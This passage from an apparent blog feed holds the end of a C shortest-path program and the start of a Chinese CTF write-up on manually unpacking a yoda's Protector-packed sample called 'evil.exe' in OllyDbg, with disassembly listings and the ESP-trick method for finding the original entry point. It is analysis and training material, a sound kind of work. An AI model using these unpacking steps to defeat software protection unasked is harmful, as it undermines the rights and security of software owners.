i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = i+<span class="number">1</span>; j &lt;= n; j++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"from %s to %s: %d\n"</span>, name[i], name[j], shortest[i][j]);</span><br><span class="line"><span class="built_in">fprintf</span>(f, <span class="string">"%s %s %d\n"</span>, name[i], name[j], shortest[i][j]);</span><br><span class="line"><span class="keyword">if</span>(shortest[i][j] == INF)<span class="comment">//没有路径 </span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"which means no path.\n"</span>);</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"path: "</span>);</span><br><span class="line"><span class="keyword">int</span> k = i;</span><br><span class="line"><span class="keyword">while</span>(k != j)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %s -&gt;"</span>, name[k]);</span><br><span class="line">k = path[k][j];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %s\n"</span>,name[j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//以下是记录两个节点的最短路径与之间的距离 </span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line"><span class="built_in">fprintf</span>(f, <span class="string">"%d "</span>, <span class="built_in">map</span>[i][j]);</span><br><span class="line"><span class="built_in">fprintf</span>(f, <span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line"><span class="built_in">fprintf</span>(f, <span class="string">"%d "</span>, path[i][j]);</span><br><span class="line"><span class="built_in">fprintf</span>(f, <span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fclose(f);</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:&#123;</span><br><span class="line"><span class="keyword">char</span> name1[<span class="number">20</span>], name2[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">int</span> t;</span><br><span class="line">f = fopen(<span class="string">"AllPath.dat"</span>, <span class="string">"r"</span>);</span><br><span class="line"><span class="built_in">fscanf</span>(f, <span class="string">"%d"</span>, &amp;n);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line"><span class="built_in">fscanf</span>(f, <span class="string">"%s"</span>, name[i]);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n*(n<span class="number">-1</span>)/<span class="number">2</span>; i++)&#123;</span><br><span class="line"><span class="built_in">fscanf</span>(f, <span class="string">"%s %s %d"</span>, name1, name2, &amp;t);</span><br><span class="line">shortest[Search_Id(name1)][Search_Id(name2)] = t;</span><br><span class="line">shortest[Search_Id(name2)][Search_Id(name1)] = t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//以下是读取两个节点的最短路径与之间的距离 </span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line"><span class="built_in">fscanf</span>(f, <span class="string">"%d "</span>, &amp;<span class="built_in">map</span>[i][j]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line"><span class="built_in">fscanf</span>(f, <span class="string">"%d "</span>, &amp;path[i][j]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"All the locations:\n"</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s "</span>,name[i]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\ninput two locations:"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s%s"</span>,name1,name2);</span><br><span class="line"><span class="keyword">int</span> u = Search_Id(name1);</span><br><span class="line"><span class="keyword">int</span> v = Search_Id(name2);</span><br><span class="line"><span class="keyword">if</span>(u==<span class="number">-1</span> || v==<span class="number">-1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Invalid name!\n"</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">"from %s to %s is %d\n"</span>, name1, name2, shortest[u][v]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(shortest[u][v]==INF)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"which means no path.\n"</span>);</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"path: "</span>);</span><br><span class="line"><span class="keyword">int</span> k = u;</span><br><span class="line"><span class="keyword">while</span>(k != v)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %s -&gt;(%d)-&gt; "</span>, name[k], <span class="built_in">map</span>[k][path[k][v]]);</span><br><span class="line">k = path[k][v];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %s\n"</span>,name[v]);</span><br><span class="line">&#125;</span><br><span class="line">fclose(f);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">while</span>(Choice);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="project" scheme="https://mrh1s.top/categories/project/"/>
    
    
  </entry>
  
  <entry>
    <title>JarvisOJ_DD_Evil_Exe</title>
    <link href="https://mrh1s.top/posts/db7ddaa/"/>
    <id>https://mrh1s.top/posts/db7ddaa/</id>
    <published>2019-06-13T16:10:40.000Z</published>
    <updated>2020-03-04T14:05:59.416Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1>Evil_Exe(not totallly succeeded)</h1><p><a href="/uploads/DD_Evil_Exe.7z">DD_Evil_Exe.7z</a></p><h2 id="思路">思路</h2><blockquote><p>程序双击打开后什么都没有发生，然后exe文件被删除了，取而代之的是一个docx文件</p></blockquote><p>用ida打开该文件，显示无法翻译，怀疑使用了壳进行加密</p><h3 id="查壳">查壳</h3><p>用peid去查询壳类型</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/06/14/5d0277534c24796706.png" alt="Snipaste_2019-06-14_00-18-08.png"></p><p>显示是yoda’s Protector，使用对应的脱壳器进行脱壳，失败</p><h3 id="去壳">去壳</h3><p>用ollydbg手动去壳：</p><p>0x0043DCA8处是一个pushad，经过调试，程序会在此反复地pushad+popad地循环，所以直接设置eip至0x0043DCA2</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0043DC85 &gt; $  56            push esi                                 ;  evil.&lt;ModuleEntryPoint&gt;</span><br><span class="line">0043DC86   .  E8 00000000   call evil.0043DC8B</span><br><span class="line">0043DC8B   $  5E            pop esi                                  ;  kernel32.76B80419</span><br><span class="line">0043DC8C   .  B8 90110000   mov eax,0x1190</span><br><span class="line">0043DC91   .  81EE 8B8C0000 sub esi,0x8C8B</span><br><span class="line">0043DC97   &gt;  E8 0C000000   call evil.0043DCA8</span><br><span class="line">0043DC9C   .  83C6 08       add esi,0x8</span><br><span class="line">0043DC9F   .  48            dec eax</span><br><span class="line">0043DCA0   .^ 75 F5         jnz short evil.0043DC97</span><br><span class="line">0043DCA2   .  5E            pop esi                                  ;  kernel32.76B80419</span><br><span class="line">0043DCA3   .^ E9 08FEFFFF   jmp evil.0043DAB0</span><br><span class="line"></span><br><span class="line">0043DCA8  /$  60            pushad</span><br><span class="line">0043DCA9  |.  56            push esi                                 ;  evil.&lt;ModuleEntryPoint&gt;</span><br><span class="line">0043DCAA  |.  AD            lods dword ptr ds:[esi]</span><br><span class="line">0043DCAB  |.  93            xchg eax,ebx</span><br><span class="line">0043DCAC  |.  AD            lods dword ptr ds:[esi]</span><br><span class="line">0043DCAD  |.  92            xchg eax,edx                             ;  evil.&lt;ModuleEntryPoint&gt;</span><br><span class="line">0043DCAE  |.  BF 74713414   mov edi,0x14347174</span><br><span class="line">0043DCB3  |.  BD 34443144   mov ebp,0x44314434</span><br><span class="line">0043DCB8  |.  B9 AC174798   mov ecx,0x984717AC</span><br><span class="line">0043DCBD  |.  BE 15DCE8AF   mov esi,0xAFE8DC15</span><br><span class="line">0043DCC2  |.  33C0          xor eax,eax</span><br><span class="line">0043DCC4  |&gt;  C1CB 08       /ror ebx,0x8</span><br><span class="line">0043DCC7  |.  03DA          |add ebx,edx                             ;  evil.&lt;ModuleEntryPoint&gt;</span><br><span class="line">0043DCC9  |.  33DF          |xor ebx,edi                             ;  evil.&lt;ModuleEntryPoint&gt;</span><br><span class="line">0043DCCB  |.  C1C2 03       |rol edx,0x3</span><br><span class="line">0043DCCE  |.  33D3          |xor edx,ebx</span><br><span class="line">0043DCD0  |.  C1CD 08       |ror ebp,0x8</span><br><span class="line">0043DCD3  |.  03EF          |add ebp,edi                             ;  evil.&lt;ModuleEntryPoint&gt;</span><br><span class="line">0043DCD5  |.  33E8          |xor ebp,eax</span><br><span class="line">0043DCD7  |.  C1C7 03       |rol edi,0x3</span><br><span class="line">0043DCDA  |.  33FD          |xor edi,ebp</span><br><span class="line">0043DCDC  |.  87F1          |xchg ecx,esi                            ;  evil.&lt;ModuleEntryPoint&gt;</span><br><span class="line">0043DCDE  |.  87F5          |xchg ebp,esi                            ;  evil.&lt;ModuleEntryPoint&gt;</span><br><span class="line">0043DCE0  |.  40            |inc eax</span><br><span class="line">0043DCE1  |.  3C 1B         |cmp al,0x1B</span><br><span class="line">0043DCE3  |.^ 75 DF         \jnz short evil.0043DCC4</span><br><span class="line">0043DCE5  |.  5F            pop edi                                  ;  kernel32.76B80419</span><br><span class="line">0043DCE6  |.  93            xchg eax,ebx</span><br><span class="line">0043DCE7  |.  AB            stos dword ptr es:[edi]</span><br><span class="line">0043DCE8  |.  92            xchg eax,edx                             ;  evil.&lt;ModuleEntryPoint&gt;</span><br><span class="line">0043DCE9  |.  AB            stos dword ptr es:[edi]</span><br><span class="line">0043DCEA  |.  61            popad</span><br><span class="line">0043DCEB  \.  C3            retn</span><br></pre></td></tr></table></figure><p>来到此处，又看到一个pushad，但是这个pushad后面的popad是找不到了，最好使用esp定律来寻找popad</p><p>按一下F8，并记录下esp的值 0x0019FF54</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0043DAB0   &gt; /60            pushad</span><br><span class="line">0043DAB1   . |BE 00504300   mov esi,evil.00435000</span><br><span class="line">0043DAB6   . |8DBE 00C0FCFF lea edi,dword ptr ds:[esi-0x34000]</span><br><span class="line">0043DABC   . |57            push edi                                 ;  evil.&lt;ModuleEntryPoint&gt;</span><br><span class="line">0043DABD   . |83CD FF       or ebp,-0x1</span><br><span class="line">0043DAC0   . |EB 10         jmp short evil.0043DAD2</span><br><span class="line">0043DAC2     |90            nop</span><br><span class="line">0043DAC3     |90            nop</span><br><span class="line">0043DAC4     |90            nop</span><br></pre></td></tr></table></figure><p>dd 0019FF54</p><p>设置硬件断点</p><p><a href="https://i.loli.net/2019/06/14/5d027ab23772f85550.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/06/14/5d027ab23772f85550.png" alt="Snipaste_2019-06-14_00-32-25.png"></a></p><p>来到0x0043DC2E处</p><blockquote><p>我开始没有分析出来，原来这里0x0043DC3B隐藏着一句jmp命令</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0043DC2D   .  61            popad</span><br><span class="line">0043DC2E   .  8D4424 80     lea eax,dword ptr ss:[esp-0x80]</span><br><span class="line">0043DC32   &gt;  6A 00         push 0x0</span><br><span class="line">0043DC34   .  39C4          cmp esp,eax</span><br><span class="line">0043DC36   .^ 75 FA         jnz short evil.0043DC32</span><br><span class="line">0043DC38   .  83EC 80       sub esp,-0x80</span><br><span class="line">0043DC3B   .  E9            db E9</span><br><span class="line">0043DC3C   .  A6            db A6</span><br><span class="line">0043DC3D   .  48            db 48                                    ;  CHAR &apos;H&apos;</span><br><span class="line">0043DC3E   .  FC            db FC</span><br><span class="line">0043DC3F   .  FF            db FF</span><br><span class="line">0043DC40      48            db 48                                    ;  CHAR &apos;H&apos;</span><br></pre></td></tr></table></figure><p>手动分析之后得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0043DC2D   .  61            popad</span><br><span class="line">0043DC2E   .  8D4424 80     lea eax,dword ptr ss:[esp-0x80]</span><br><span class="line">0043DC32   &gt;  6A 00         push 0x0</span><br><span class="line">0043DC34   .  39C4          cmp esp,eax</span><br><span class="line">0043DC36   .^ 75 FA         jnz short evil.0043DC32</span><br><span class="line">0043DC38   .  83EC 80       sub esp,-0x80</span><br><span class="line">0043DC3B    - E9 A648FCFF   jmp evil.004024E6</span><br><span class="line">0043DC40      48            db 48                                    ;  CHAR &apos;H&apos;</span><br></pre></td></tr></table></figure><p>再F8几下，F4，并且去掉硬件断点（避免反复断）得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">004024E6    E8 BB2D0000     call evil.004052A6</span><br><span class="line">004024EB  ^ E9 78FEFFFF     jmp evil.00402368</span><br></pre></td></tr></table></figure><blockquote><p>这是windows程序最明显的入口，一个call+一个jmp，我们只需要把这个地方作为入口点dump出来即可</p></blockquote><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/06/14/5d027d461939036751.png" alt="Snipaste_2019-06-14_00-43-37.png"></p><blockquote><p>接下来就可以用ida来查看各个函数了</p></blockquote><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98P